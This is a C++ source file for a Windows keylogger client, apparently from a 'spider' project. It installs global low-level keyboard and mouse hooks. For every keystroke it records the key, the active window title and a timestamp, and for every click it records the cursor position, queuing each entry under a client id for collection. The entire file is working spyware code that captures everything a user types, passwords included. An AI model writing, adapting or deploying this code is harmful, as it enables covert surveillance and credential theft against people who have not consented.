#include "Keylogger.hpp"

namespace spider
{
	namespace client
	{
		bool		Keylogger::_shift = false;
		bool		Keylogger::_capsLock = false;
		HHOOK		Keylogger::_hHookKeyboard = NULL;
		HHOOK		Keylogger::_hHookMouse = NULL;
		const bool	Keylogger::_ERROR = true;
		const bool	Keylogger::_SUCCESS = false;
		DataQueueSP	Keylogger::_staticDataQueue = NULL;
		std::string	Keylogger::_id = "";

		Keylogger::Keylogger(const std::string& id, const DataQueueSP& dataQueue)
		{
			_dataQueue = dataQueue;
			_staticDataQueue = _dataQueue;
			_id = id;
		}

		Keylogger::~Keylogger()
		{}

		void	Keylogger::windowSize()
		{
			RECT desktop;
			const HWND hDesktop = GetDesktopWindow();

			GetWindowRect(hDesktop, &desktop);
			_windowSize = std::make_pair(desktop.right, desktop.bottom);
		}

		void	Keylogger::timestamp()
		{
			__time64_t timer;

			_time64(&timer);
			_timeStamp = static_cast<int>(timer);
		}

		void	Keylogger::activeWindow()
		{
			char windowTitle[256];
			HWND hwnd;

			hwnd = GetForegroundWindow();
			GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
			_windowName = std::string(windowTitle);
		}

		void	Keylogger::formatInput()
		{
			bool	toFormat = true;

			if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
				_capsLock = true;
			if (_input.length() > 1)
			{
				if (_input == "Caps Lock")
				{
					_capsLock = !_capsLock;
					if (!_capsLock)
						_input = ("[" + _input + " Off]");
					else if (_capsLock)
						_input = ("[" + _input + " On]");
				}
				else
					_input = ("[" + _input + "]");
				toFormat = false;
			}
			if (!_capsLock && toFormat)
				for (size_t i = 0; i < _input.length(); ++i)
					_input[i] = tolower(_input[i]);
		}

		LRESULT CALLBACK	Keylogger::mouseEvent(int nCode, WPARAM wParam, LPARAM lParam)
		{
			if (nCode == HC_ACTION)
			{
				if (wParam == WM_LBUTTONDOWN || wParam == WM_MBUTTONDOWN || wParam == WM_RBUTTONDOWN)
				{
					POINT p;
					std::string click;

					switch (wParam)
					{
					case WM_LBUTTONDOWN:
						click = "left click";
						break;
					case WM_MBUTTONDOWN:
						click = "middle click";
						break;
					case WM_RBUTTONDOWN:
						click = "right click";
						break;
					default:
						break;
					}
					Keylogger k;

					k.activeWindow();
					k.timestamp();
					k.windowSize();
					GetCursorPos(&p);
					k._mouseCoord = std::make_pair(p.x, p.y);
					k.pushMouseDataInQueue();
				}
			}
			return CallNextHookEx(_hHookMouse, nCode, wParam, lParam);
		}


		LRESULT CALLBACK	Keylogger::keyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
		{
			KBDLLHOOKSTRUCT hooked_key;

			if ((nCode == HC_ACTION)
				&& ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
			{
				DWORD dwMsg = 1;
				char keyName[0xFF] = { 0 };
				hooked_key = *((KBDLLHOOKSTRUCT*)lParam);

				dwMsg += (hooked_key.scanCode) << 16;
				dwMsg += (hooked_key.flags) << 24;
				GetKeyNameText(dwMsg, keyName, 0xFF);

				Keylogger k;
				k._input = std::string(keyName);

				k.formatInput();
				k.activeWindow();
				k.timestamp();
				k.windowSize();
				k.pushKeyboardDataInQueue();
			}
			return CallNextHookEx(_hHookKeyboard, nCode, wParam, lParam);
		}

		void			Keylogger::messageLoop()
		{
			MSG			msg;

			while (GetMessage(&msg, NULL, 0, 0))
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}


		DWORD WINAPI	Keylogger::startHook(LPVOID lpParm)
		{
			HINSTANCE	hInstance;
			
			if ((hInstance = GetModuleHandle(NULL)) == NULL) {
				return 1;
			}
			if ((_hHookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboardEvent, hInstance, NULL)) == NULL) {
				return 1;
			}
			if ((_hHookMouse = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)mouseEvent, hInstance, NULL)) == NULL) {
				return 1;
			}
			messageLoop();
			if (_hHookKeyboard != NULL)
				UnhookWindowsHookEx(_hHookKeyboard);
			if (_hHookMouse != NULL)
				UnhookWindowsHookEx(_hHookMouse);
			return 0;
		}


		int				Keylogger::startThread()
		{
			HANDLE		hThread;
			DWORD		dwThread;

			if ((hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)startHook, (LPVOID)NULL, NULL, &dwThread)) != NULL)
				return WaitForSingleObject(hThread, INFINITE);
			else
			{
				throw exception::KeyloggerException("CreateThread failed");
				return 1;
			}
		}

		bool			Keylogger::startKeylogger()
		{
			try {
				startThread();
			}
			catch (const std::exception& e) {
				std::cerr << e.what() << std::endl;
				return _ERROR;
			}
			return _SUCCESS;
		}

		void			Keylogger::pushKeyboardDataInQueue()
		{
			auto log = std::make_shared<LogInput>(_id, _timeStamp, _windowName, _input);

			std::lock_guard<std::mutex> guard(_staticDataQueue->_mutex);
			_staticDataQueue->_dataQueue.push(log);
		}

		void			Keylogger::pushMouseDataInQueue()
		{
			auto log = std::make_shared<LogMouse>(_id, _timeStamp, _windowName, getWindowSize(), getMouseCoord());
			
			std::lock_guard<std::mutex> guard(_staticDataQueue->_mutex);
			_staticDataQueue->_dataQueue.push(log);
		}


		const std::string&		Keylogger::getInput() const
		{
			return _input;
		}

		int				Keylogger::getTimeStamp() const
		{
			return _timeStamp;
		}

		const std::string&		Keylogger::getWindowName() const
		{
			return _windowName;
		}

		const std::pair<int, int>&		Keylogger::getMouseCoord() const	
		{
			return _mouseCoord;
		}

		const std::pair<int, int>&		Keylogger::getWindowSize() const	
		{
			return _windowSize;
		}
	}
}
